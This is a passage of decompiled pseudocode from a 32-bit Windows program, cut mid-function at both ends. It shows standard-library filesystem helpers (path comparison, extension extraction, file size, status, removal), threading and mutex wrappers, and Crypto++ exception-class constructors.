  v23 = (char *)this;
  if ( (unsigned int)this[5] >= 8 )
  {
    v3 = *this;
    v23 = (char *)*this;
  }
  v4 = (unsigned __int16 *)(v3 + 2 * this[4]);
  v24 = sub_403CE0(v3, v4);
  v19 = (unsigned __int16 *)&a2[2 * a3];
  v22 = sub_403CE0((int)a2, v19);
  v5 = ((int)v24 - v3) >> 1;
  v20 = v5;
  if ( ((char *)v22 - a2) >> 1 < v5 )
    v5 = ((char *)v22 - a2) >> 1;
  v21 = ((char *)v22 - a2) >> 1;
  result = sub_41FDB0(v23, a2, v5);
  if ( !result )
  {
    if ( v20 >= v21 )
    {
      if ( v20 <= v21 )
      {
        for ( i = v24; i != v4; ++i )
        {
          v8 = *i;
          if ( v8 != 92 && v8 != 47 )
            break;
        }
        v9 = v22;
        v10 = v22;
        if ( v22 != v19 )
        {
          do
          {
            v11 = *v10;
            if ( v11 != 92 && v11 != 47 )
              break;
            ++v10;
          }
          while ( v10 != v19 );
          v9 = v22;
        }
        result = (v24 != i) - (v9 != v10);
        if ( !result )
        {
          for ( j = (v10 == v19) - (i == v4); i != v4; j = (v10 == v19) - (i == v4) )
          {
            if ( j )
              break;
            v13 = *i;
            v14 = v13 == 92 || v13 == 47;
            v15 = *v10;
            v16 = v15 == 92 || v15 == 47;
            j = v16 - v14;
            if ( j )
              break;
            if ( v14 )
            {
              for ( ++i; i != v4; ++i )
              {
                v17 = *i;
                if ( v17 != 92 && v17 != 47 )
                  break;
              }
              for ( ++v10; v10 != v19; ++v10 )
              {
                v18 = *v10;
                if ( v18 != 92 && v18 != 47 )
                  break;
              }
            }
            else
            {
              j = *i - *v10;
              if ( j )
                return j;
              ++i;
              ++v10;
            }
          }
          return j;
        }
      }
      else
      {
        return 1;
      }
    }
    else
    {
      return -1;
    }
  }
  return result;
}

//----- (00404120) --------------------------------------------------------
int __thiscall sub_404120(_DWORD *this, int a2)
{
  int v2; // eax
  unsigned __int16 *v3; // edi
  unsigned __int16 *v4; // esi
  unsigned __int16 *v5; // eax
  int v6; // ecx
  int v7; // edx
  unsigned __int16 *v8; // edx
  unsigned __int16 *v9; // ecx

  v2 = this[4];
  if ( this[5] >= 8u )
    this = (_DWORD *)*this;
  v3 = (unsigned __int16 *)this + v2;
  v4 = v3;
  v5 = sub_403CE0((int)this, v3);
  if ( v5 != v3 )
  {
    while ( 1 )
    {
      v6 = *v5;
      if ( v6 != 92 && v6 != 47 )
        break;
      if ( ++v5 == v3 )
        goto LABEL_12;
    }
    if ( v5 != v3 )
    {
      do
      {
        v7 = *(v4 - 1);
        if ( v7 == 92 )
          break;
        if ( v7 == 47 )
          break;
        --v4;
      }
      while ( v5 != v4 );
    }
  }
LABEL_12:
  v8 = v4;
  if ( v4 == v3 )
    goto LABEL_24;
  do
  {
    if ( *v8 == 58 )
      break;
    ++v8;
  }
  while ( v8 != v3 );
  if ( v4 == v8 )
    goto LABEL_24;
  v9 = v8 - 1;
  if ( v4 == v8 - 1 )
    goto LABEL_24;
  if ( *v9 == 46 )
  {
    if ( v4 == v8 - 2 && *(v8 - 2) == 46 )
      goto LABEL_24;
  }
  else
  {
    v9 = v8 - 2;
    if ( v4 == v8 - 2 )
    {
LABEL_24:
      v9 = v8;
      goto LABEL_25;
    }
    while ( *v9 != 46 )
    {
      if ( v4 == --v9 )
        goto LABEL_24;
    }
  }
LABEL_25:
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 7;
  *(_WORD *)a2 = 0;
  sub_41EB20((void **)a2, v9, v8 - v9);
  return a2;
}

//----- (00404290) --------------------------------------------------------
int __thiscall sub_404290(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  v2 = this[5];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)*this;
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  result = 0;
  this[4] = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  return result;
}

//----- (00404330) --------------------------------------------------------
int __userpurge sub_404330@<eax>(int a1@<ecx>, int a2@<ebp>, _DWORD *a3, WCHAR *a4, int a5, int a6)
{
  char *v7; // eax
  void *v8; // ecx
  __int128 v10; // [esp-2Ch] [ebp-38h] BYREF
  __int64 v11; // [esp-1Ch] [ebp-28h]
  char *v12; // [esp-14h] [ebp-20h]
  int *v13; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v15; // [esp-8h] [ebp-14h]
  int v16; // [esp-4h] [ebp-10h]
  _DWORD v17[2]; // [esp+0h] [ebp-Ch] BYREF
  int v18; // [esp+8h] [ebp-4h] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v17[0] = a2;
  v17[1] = retaddr;
  v16 = -1;
  v15 = &loc_4ABA89;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v13 = &v18;
  sub_402C90(a1, (int)v17, a5, a6, a3);
  *(_DWORD *)a1 = &std::system_error::`vftable';
  v16 = 1;
  *(_DWORD *)a1 = &std::filesystem::filesystem_error::`vftable';
  sub_419530((_DWORD *)(a1 + 20), a4);
  v12 = (char *)(a1 + 44);
  *(_OWORD *)(a1 + 44) = 0i64;
  *(_QWORD *)(a1 + 60) = 0i64;
  *(_DWORD *)(a1 + 60) = 0;
  *(_DWORD *)(a1 + 64) = 7;
  *(_WORD *)(a1 + 44) = 0;
  v11 = 0x700000000i64;
  v10 = 0i64;
  LOWORD(v10) = 0;
  LOBYTE(v16) = 7;
  v7 = "Unknown exception";
  if ( *(_DWORD *)(a1 + 4) )
    v7 = *(char **)(a1 + 4);
  v12 = v7 + 1;
  sub_4044C0(a1 + 68, a4, (const WCHAR *)&v10, v7, strlen(v7));
  LOBYTE(v16) = 9;
  if ( HIDWORD(v11) >= 8 )
  {
    v8 = (void *)v10;
    if ( (unsigned int)(2 * HIDWORD(v11) + 2) >= 0x1000 )
    {
      v8 = *(void **)(v10 - 4);
      if ( (unsigned int)(v10 - (_DWORD)v8 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v8);
  }
  v11 = 0x700000000i64;
  LOWORD(v10) = 0;
  v16 = -1;
  return a1;
}
// 4B83D0: using guessed type void *std::system_error::`vftable';
// 4CF8F4: using guessed type void *std::filesystem::filesystem_error::`vftable';

//----- (004044B0) --------------------------------------------------------
_DWORD *__thiscall sub_4044B0(_DWORD *this)
{
  _DWORD *result; // eax

  result = this + 17;
  if ( this[22] >= 0x10u )
    return (_DWORD *)*result;
  return result;
}

//----- (004044C0) --------------------------------------------------------
int __fastcall sub_4044C0(int a1, const WCHAR *a2, const WCHAR *a3, void *Src, size_t Size)
{
  unsigned int v6; // edx
  int v7; // ecx
  char *v8; // eax
  char *v9; // esi
  unsigned int v10; // ecx
  int v11; // esi
  char *v12; // ebx
  unsigned int v13; // ecx
  int v14; // esi
  char *v15; // ebx
  unsigned int v16; // ecx
  unsigned int v17; // edx
  char *v18; // eax
  void *v19; // ecx
  void *v20; // ecx
  int v22; // [esp+1Ch] [ebp-48h]
  int v23[4]; // [esp+20h] [ebp-44h] BYREF
  int v24; // [esp+30h] [ebp-34h]
  unsigned int v25; // [esp+34h] [ebp-30h]
  int v26[4]; // [esp+38h] [ebp-2Ch] BYREF
  int v27; // [esp+48h] [ebp-1Ch]
  unsigned int v28; // [esp+4Ch] [ebp-18h]
  int v29; // [esp+60h] [ebp-4h]

  v22 = a1;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  v29 = 0;
  sub_403E20(a2, (int)v23);
  v29 = 1;
  sub_403E20(a3, (int)v26);
  LOBYTE(v29) = 2;
  sub_4196B0((void **)a1, Size + v27 + v24 + 4 * (v27 != 0) + 4);
  v6 = *(_DWORD *)(a1 + 20);
  v7 = *(_DWORD *)(a1 + 16);
  if ( Size > v6 - v7 )
  {
    LOBYTE(v22) = 0;
    sub_424F60((void **)a1, Size, v22, Src, Size);
  }
  else
  {
    *(_DWORD *)(a1 + 16) = Size + v7;
    v8 = (char *)a1;
    if ( v6 >= 0x10 )
      v8 = *(char **)a1;
    v9 = &v8[v7];
    memmove_0(&v8[v7], Src, Size);
    v9[Size] = 0;
  }
  v10 = *(_DWORD *)(a1 + 20);
  v11 = *(_DWORD *)(a1 + 16);
  if ( v10 - v11 < 3 )
  {
    LOBYTE(v22) = 0;
    sub_424F60((void **)a1, 3u, v22, ": \"", 3u);
  }
  else
  {
    v12 = (char *)a1;
    *(_DWORD *)(a1 + 16) = v11 + 3;
    if ( v10 >= 0x10 )
      v12 = *(char **)a1;
    memmove_0(&v12[v11], ": \"", 3u);
    v12[v11 + 3] = 0;
  }
  sub_419910((char *)a1, v23);
  if ( v27 )
  {
    v13 = *(_DWORD *)(a1 + 20);
    v14 = *(_DWORD *)(a1 + 16);
    if ( v13 - v14 < 4 )
    {
      LOBYTE(v22) = 0;
      sub_424F60((void **)a1, 4u, v22, "\", \"", 4u);
    }
    else
    {
      v15 = (char *)a1;
      *(_DWORD *)(a1 + 16) = v14 + 4;
      if ( v13 >= 0x10 )
        v15 = *(char **)a1;
      memmove_0(&v15[v14], "\", \"", 4u);
      v15[v14 + 4] = 0;
    }
    sub_419910((char *)a1, v26);
  }
  v16 = *(_DWORD *)(a1 + 16);
  v17 = *(_DWORD *)(a1 + 20);
  if ( v16 >= v17 )
  {
    LOBYTE(v22) = 0;
    sub_424B40((void **)a1, v16, v22, 34);
  }
  else
  {
    *(_DWORD *)(a1 + 16) = v16 + 1;
    v18 = (char *)a1;
    if ( v17 >= 0x10 )
      v18 = *(char **)a1;
    *(_WORD *)&v18[v16] = 34;
  }
  LOBYTE(v29) = 1;
  if ( v28 >= 0x10 )
  {
    v19 = (void *)v26[0];
    if ( v28 + 1 >= 0x1000 )
    {
      v19 = *(void **)(v26[0] - 4);
      if ( (unsigned int)(v26[0] - (_DWORD)v19 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v19);
  }
  v27 = 0;
  v28 = 15;
  LOBYTE(v26[0]) = 0;
  LOBYTE(v29) = 0;
  if ( v25 >= 0x10 )
  {
    v20 = (void *)v23[0];
    if ( v25 + 1 >= 0x1000 )
    {
      v20 = *(void **)(v23[0] - 4);
      if ( (unsigned int)(v23[0] - (_DWORD)v20 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v20);
  }
  v24 = 0;
  v25 = 15;
  LOBYTE(v23[0]) = 0;
  return a1;
}

//----- (00404760) --------------------------------------------------------
_DWORD *__thiscall sub_404760(_DWORD *this, char a2)
{
  sub_404790(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00404790) --------------------------------------------------------
int __thiscall sub_404790(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  void **v4; // edi
  unsigned int v5; // ecx
  _DWORD *v6; // eax
  void **v7; // edi
  unsigned int v8; // ecx
  void *v9; // eax

  v2 = this[22];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[17];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_17;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[21] = 0;
  this[22] = 15;
  *((_BYTE *)this + 68) = 0;
  v4 = (void **)(this + 11);
  v5 = this[16];
  if ( v5 >= 8 )
  {
    v6 = *v4;
    if ( 2 * v5 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v6 - *(v6 - 1) - 4 > 0x1F )
        goto LABEL_17;
      v6 = (_DWORD *)*(v6 - 1);
    }
    sub_46C87D(v6);
  }
  this[15] = 0;
  this[16] = 7;
  *(_WORD *)v4 = 0;
  v7 = (void **)(this + 5);
  v8 = this[10];
  if ( v8 >= 8 )
  {
    v9 = *v7;
    if ( 2 * v8 + 2 < 0x1000 )
    {
LABEL_15:
      sub_46C87D(v9);
      goto LABEL_16;
    }
    if ( (unsigned int)v9 - *((_DWORD *)v9 - 1) - 4 <= 0x1F )
    {
      v9 = (void *)*((_DWORD *)v9 - 1);
      goto LABEL_15;
    }
LABEL_17:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_16:
  this[9] = 0;
  this[10] = 7;
  *(_WORD *)v7 = 0;
  *this = &std::exception::`vftable';
  return __std_exception_destroy(this + 1);
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (004048F0) --------------------------------------------------------
int __thiscall sub_4048F0(int this, _DWORD *a2)
{
  sub_403960((char *)this, (int)a2);
  *(_DWORD *)this = &std::filesystem::filesystem_error::`vftable';
  sub_419530((_DWORD *)(this + 20), a2 + 5);
  sub_419530((_DWORD *)(this + 44), a2 + 11);
  sub_419BE0((_DWORD *)(this + 68), a2 + 17);
  return this;
}
// 4CF8F4: using guessed type void *std::filesystem::filesystem_error::`vftable';

//----- (00404980) --------------------------------------------------------
void __fastcall __noreturn sub_404980(void *a1, int a2, WCHAR *a3, int a4)
{
  int *v4; // eax
  int v5; // edi
  int v6; // esi
  _BYTE v7[96]; // [esp-98h] [ebp-A4h] BYREF
  _DWORD v8[6]; // [esp-38h] [ebp-44h] BYREF
  int v9; // [esp-20h] [ebp-2Ch] BYREF
  WCHAR *v10; // [esp-18h] [ebp-24h]
  void *v11; // [esp-14h] [ebp-20h]
  int *v12; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v14; // [esp-8h] [ebp-14h]
  int v15; // [esp-4h] [ebp-10h]
  _DWORD v16[2]; // [esp+0h] [ebp-Ch] BYREF
  int v17; // [esp+8h] [ebp-4h] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v16[1] = retaddr;
  v15 = -1;
  v14 = &loc_4ABBD8;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v12 = &v17;
  v11 = a1;
  v10 = a3;
  v4 = sub_403C60(&v9, a2);
  v5 = *v4;
  v6 = v4[1];
  sub_419B80((int)v8, v11);
  v15 = 0;
  sub_404330((int)v7, (int)v16, v8, v10, v5, v6);
  _CxxThrowException(v7, (_ThrowInfo *)&_TI5_AVfilesystem_error_filesystem_std__);
}

//----- (00404A10) --------------------------------------------------------
void __fastcall __noreturn sub_404A10(int a1, int *a2, WCHAR *a3, int a4)
{
  int v4; // edi
  int v5; // esi
  _BYTE v6[100]; // [esp-90h] [ebp-9Ch] BYREF
  _DWORD v7[6]; // [esp-2Ch] [ebp-38h] BYREF
  WCHAR *v8; // [esp-14h] [ebp-20h]
  int *v9; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v11; // [esp-8h] [ebp-14h]
  int v12; // [esp-4h] [ebp-10h]
  _DWORD v13[2]; // [esp+0h] [ebp-Ch] BYREF
  int v14; // [esp+8h] [ebp-4h] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v13[1] = retaddr;
  v12 = -1;
  v11 = &loc_4ABC08;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v9 = &v14;
  v4 = *a2;
  v5 = a2[1];
  v8 = a3;
  sub_419B80((int)v7, "exists");
  v12 = 0;
  sub_404330((int)v6, (int)v13, v7, v8, v4, v5);
  _CxxThrowException(v6, (_ThrowInfo *)&_TI5_AVfilesystem_error_filesystem_std__);
}

//----- (00404AA0) --------------------------------------------------------
bool __thiscall sub_404AA0(WCHAR *this)
{
  int v2; // ecx
  unsigned int *v3; // eax
  int v4; // ebx
  bool result; // al
  int v6; // [esp+0h] [ebp-30h]
  __int64 v7; // [esp+Ch] [ebp-24h]
  unsigned int v8; // [esp+18h] [ebp-18h] BYREF
  int v9[4]; // [esp+1Ch] [ebp-14h] BYREF

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_4F1530,
          (int (__stdcall *)(void *, void *, void **))sub_426530,
          &unk_4F15A0) )
    goto LABEL_9;
  v3 = sub_404C40(&v8);
  v4 = v3[2];
  v7 = *(_QWORD *)v3;
  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_4F1530,
          (int (__stdcall *)(void *, void *, void **))sub_426530,
          &unk_4F15A0) )
    goto LABEL_9;
  v9[0] = v4;
  v9[1] = (int)&unk_4F15A0;
  if ( (_DWORD)v7 )
  {
    if ( std::_Execute_once(
           (struct std::once_flag *)&unk_4F1530,
           (int (__stdcall *)(void *, void *, void **))sub_426530,
           &unk_4F15A0) )
    {
      return (_DWORD)v7 != 1;
    }
LABEL_9:
    terminate(v2);
  }
  result = 0;
  if ( v4 )
    sub_404A10(v2, v9, this, v6);
  return result;
}
// 404B54: variable 'v2' is possibly undefined
// 404B54: variable 'v6' is possibly undefined
// 469B45: using guessed type _DWORD __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *);
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00404B60) --------------------------------------------------------
__int64 __thiscall sub_404B60(WCHAR *this)
{
  WCHAR *v2; // eax
  int stats; // eax
  int v5; // [esp+0h] [ebp-30h]
  char v6[8]; // [esp+8h] [ebp-28h] BYREF
  __int64 v7; // [esp+10h] [ebp-20h]

  v2 = this;
  if ( *((_DWORD *)this + 5) >= 8u )
    v2 = *(WCHAR **)this;
  stats = __std_fs_get_stats(v2, v6, 9, -1);
  if ( stats )
    sub_404980("file_size", stats, this, v5);
  return v7;
}
// 404BB4: variable 'v5' is possibly undefined
// 4694D4: using guessed type _DWORD __stdcall __std_fs_get_stats(_DWORD, _DWORD, _DWORD, _DWORD);
// 404B60: using guessed type char var_28[8];

//----- (00404BC0) --------------------------------------------------------
bool __thiscall sub_404BC0(WCHAR *this)
{
  const __m128i *v2; // eax
  unsigned __int32 v3; // xmm0_4
  int v4; // edx
  int v6; // [esp+0h] [ebp-20h]
  unsigned int v7[4]; // [esp+10h] [ebp-10h] BYREF

  v2 = (const __m128i *)sub_404C40(v7);
  v3 = _mm_loadl_epi64(v2).m128i_u32[0];
  v4 = v2->m128i_i32[2];
  if ( v4 && v3 != 1 && v3 != 9 )
    sub_404980("status", v4, this, v6);
  return v3 == 2;
}
// 404C09: variable 'v6' is possibly undefined
// 404BC0: using guessed type unsigned int var_10[4];

//----- (00404C10) --------------------------------------------------------
int __thiscall sub_404C10(int this)
{
  const WCHAR *v2; // eax
  int result; // eax
  int v4; // edx
  int v5; // [esp+0h] [ebp-8h]

  v2 = (const WCHAR *)this;
  if ( *(_DWORD *)(this + 20) >= 8u )
    v2 = *(const WCHAR **)this;
  result = __std_fs_remove(v2);
  if ( v4 )
    sub_404980("remove", v4, (WCHAR *)this, v5);
  return result;
}
// 404C2C: variable 'v4' is possibly undefined
// 404C39: variable 'v5' is possibly undefined
// 46984B: using guessed type _DWORD __stdcall __std_fs_remove(LPCWSTR lpPathName);

//----- (00404C40) --------------------------------------------------------
unsigned int *__cdecl sub_404C40(unsigned int *a1)
{
  _DWORD *v1; // ecx
  unsigned int stats; // eax
  unsigned int v3; // edx
  int v4; // eax
  unsigned int *result; // eax
  char v6[16]; // [esp+8h] [ebp-2Ch] BYREF
  unsigned int v7; // [esp+18h] [ebp-1Ch]
  int v8; // [esp+1Ch] [ebp-18h]

  *a1 = 0;
  a1[1] = 0xFFFF;
  if ( v1[5] >= 8u )
    v1 = (_DWORD *)*v1;
  stats = __std_fs_get_stats(v1, v6, 3, -1);
  a1[2] = stats;
  if ( stats )
  {
    a1[1] = 0xFFFF;
    if ( stats == 2 || stats == 3 )
    {
      *a1 = 1;
      return a1;
    }
    else
    {
      *a1 = 0;
      return a1;
    }
  }
  else
  {
    v3 = v7;
    v4 = 511;
    if ( (v7 & 1) != 0 )
      v4 = 365;
    a1[1] = v4;
    if ( (v3 & 0x400) == 0 )
      goto LABEL_11;
    if ( v8 == -1610612724 )
    {
      *a1 = 4;
      return a1;
    }
    if ( v8 == -1610612733 )
    {
      *a1 = 10;
      return a1;
    }
    else
    {
LABEL_11:
      result = a1;
      *a1 = (v3 >> 4) & 1 | 2;
    }
  }
  return result;
}
// 404C61: variable 'v1' is possibly undefined
// 4694D4: using guessed type _DWORD __stdcall __std_fs_get_stats(_DWORD, _DWORD, _DWORD, _DWORD);
// 404C40: using guessed type char var_2C[16];

//----- (00404D40) --------------------------------------------------------
int __cdecl sub_404D40(_Mtx_t a1)
{
  int result; // eax
  int v2; // esi

  result = _Mtx_lock(a1);
  v2 = result;
  if ( result )
  {
    std::_Throw_C_error(result);
    return v2;
  }
  return result;
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (00404D70) --------------------------------------------------------
int __cdecl sub_404D70(_Mtx_t a1)
{
  int result; // eax
  int v2; // esi

  result = _Mtx_unlock(a1);
  v2 = result;
  if ( result )
  {
    std::_Throw_C_error(result);
    return v2;
  }
  return result;
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (00404DA0) --------------------------------------------------------
int __cdecl sub_404DA0(int a1, struct _Mtx_internal_imp_t *a2)
{
  int result; // eax
  int v3; // esi

  result = sub_46915E(a1, a2);
  v3 = result;
  if ( result )
  {
    std::_Throw_C_error(result);
    return v3;
  }
  return result;
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (00404DD0) --------------------------------------------------------
void __thiscall sub_404DD0(_Cnd_t *this)
{
  if ( *(_BYTE *)this )
    _Cnd_destroy(this[1]);
}

//----- (00404E20) --------------------------------------------------------
void __thiscall sub_404E20(_Mtx_t *this)
{
  if ( *(_BYTE *)this )
    _Mtx_destroy(this[1]);
}

//----- (00404E70) --------------------------------------------------------
int __thiscall sub_404E70(int this)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  struct _Mtx_internal_imp_t *v6; // [esp-4h] [ebp-30h]

  v2 = _Cnd_init((_Cnd_t *)(this + 4));
  if ( v2 )
    std::_Throw_C_error(v2);
  v3 = _Mtx_init((_Mtx_t *)(this + 8), 1);
  if ( v3 )
    std::_Throw_C_error(v3);
  v6 = *(struct _Mtx_internal_imp_t **)(this + 8);
  *(_BYTE *)(this + 12) = 0;
  v4 = _Mtx_lock(v6);
  if ( v4 )
    std::_Throw_C_error(v4);
  return this;
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (00404F50) --------------------------------------------------------
void __thiscall sub_404F50(_DWORD *this)
{
  struct _Cnd_internal_imp_t *v1; // esi
  struct _Mtx_internal_imp_t *v2; // edi
  int v3; // eax

  v1 = (struct _Cnd_internal_imp_t *)this[1];
  v2 = (struct _Mtx_internal_imp_t *)this[2];
  v3 = _Mtx_unlock(v2);
  if ( v3 )
    std::_Throw_C_error(v3);
  _Mtx_destroy(v2);
  _Cnd_destroy(v1);
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (00405000) --------------------------------------------------------
unsigned int __stdcall sub_405000(void (__thiscall ***a1)(_DWORD))
{
  (**a1)(a1);
  return 0;
}

//----- (00405020) --------------------------------------------------------
int __thiscall sub_405020(_Thrd_t *this)
{
  int result; // eax

  if ( !this->_Id )
    std::_Throw_Cpp_error(1);
  if ( this->_Id == GetCurrentThreadId() )
    std::_Throw_Cpp_error(5);
  result = _Thrd_join(*this, 0);
  if ( result )
    std::_Throw_Cpp_error(2);
  this->_Id = 0;
  this->_Hnd = 0;
  return result;
}
// 469BF2: using guessed type void __cdecl __noreturn std::_Throw_Cpp_error(_DWORD);

//----- (00405090) --------------------------------------------------------
void __thiscall sub_405090(_Mtx_t this)
{
  _Mtx_destroy_in_situ(this);
}

//----- (004050D0) --------------------------------------------------------
int __thiscall sub_4050D0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  *this = &CryptoPP::Exception::`vftable';
  v2 = this[9];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[4];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[8] = 0;
  this[9] = 15;
  *((_BYTE *)this + 16) = 0;
  *this = &std::exception::`vftable';
  return __std_exception_destroy(this + 1);
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';

//----- (00405180) --------------------------------------------------------
char *__thiscall sub_405180(char *this, int a2, _DWORD *a3)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = a2;
  sub_419BE0((_DWORD *)this + 4, a3);
  return this;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';

//----- (004051F0) --------------------------------------------------------
_DWORD *__thiscall sub_4051F0(_DWORD *this)
{
  _DWORD *result; // eax

  result = this + 4;
  if ( this[9] >= 0x10u )
    return (_DWORD *)*result;
  return result;
}

//----- (00405200) --------------------------------------------------------
_DWORD *__thiscall sub_405200(_DWORD *this, char a2)
{
  sub_4050D0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00405230) --------------------------------------------------------
char *__thiscall sub_405230(char *this, _DWORD *a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 1;
  sub_419BE0((_DWORD *)this + 4, a2);
  *(_DWORD *)this = &CryptoPP::InvalidArgument::`vftable';
  return this;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B891C: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (004052B0) --------------------------------------------------------
_DWORD *__thiscall sub_4052B0(_DWORD *this, char a2)
{
  sub_4050D0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00405310) --------------------------------------------------------
int __thiscall sub_405310(_DWORD *this)
{
  return sub_4050D0(this);
}

//----- (00405360) --------------------------------------------------------
char *__thiscall sub_405360(char *this, _DWORD *a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 4;
  sub_419BE0((_DWORD *)this + 4, a2);
  *(_DWORD *)this = &CryptoPP::InvalidDataFormat::`vftable';
  return this;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B91DC: using guessed type void *CryptoPP::InvalidDataFormat::`vftable';

//----- (004053E0) --------------------------------------------------------
char *__thiscall sub_4053E0(char *this, _DWORD *a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 0;
  sub_419BE0((_DWORD *)this + 4, a2);
  *(_DWORD *)this = &CryptoPP::NotImplemented::`vftable';
  return this;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8928: using guessed type void *CryptoPP::NotImplemented::`vftable';

//----- (00405460) --------------------------------------------------------
char *__thiscall sub_405460(char *this, _DWORD *a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 2;
  sub_419BE0((_DWORD *)this + 4, a2);
  *(_DWORD *)this = &CryptoPP::CannotFlush::`vftable';
  return this;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B91F4: using guessed type void *CryptoPP::CannotFlush::`vftable';

//----- (004054F0) --------------------------------------------------------
int __thiscall sub_4054F0(void *this, _DWORD *a2, int a3, int a4)
{
  const char *v4; // edi
  void **v5; // eax
  void **v6; // eax
  void **v7; // eax
  void **v8; // eax
  void **v9; // eax
  int v10; // edi
  __int128 v11; // xmm0
  void *v12; // ecx
  void *v13; // ecx
  void *v14; // ecx
  void *v15; // ecx
  void *v16; // ecx
  void *v17; // ecx
  int v18; // eax
  unsigned int v20; // [esp-4h] [ebp-C4h]
  __int128 v21; // [esp+10h] [ebp-B0h] BYREF
  __int64 v22; // [esp+20h] [ebp-A0h]
  __int128 v23; // [esp+28h] [ebp-98h] BYREF
  __int64 v24; // [esp+38h] [ebp-88h]
  __int128 v25; // [esp+40h] [ebp-80h] BYREF
  __int64 v26; // [esp+50h] [ebp-70h]
  __int128 v27; // [esp+58h] [ebp-68h] BYREF
  __int64 v28; // [esp+68h] [ebp-58h]
  __int128 v29; // [esp+70h] [ebp-50h] BYREF
  __int64 v30; // [esp+80h] [ebp-40h]
  int v31; // [esp+88h] [ebp-38h]
  int v32; // [esp+8Ch] [ebp-34h]
  int v33; // [esp+90h] [ebp-30h]
